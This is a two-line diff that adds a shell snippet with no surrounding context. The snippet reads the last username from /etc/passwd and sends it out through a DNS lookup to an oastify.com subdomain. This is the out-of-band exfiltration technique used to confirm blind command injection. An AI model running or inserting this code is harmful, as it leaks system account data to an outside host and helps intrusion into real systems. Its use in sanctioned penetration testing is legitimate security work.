@@ -1,0 +1,2 @@
+nombre=$(cat /etc/passwd | tail -n 1 | cut -d ":" -f 1)   
+nslookup $nombre.x31qbsrj04e0e3mo3wzic84dt4zvnmbb.oastify.com
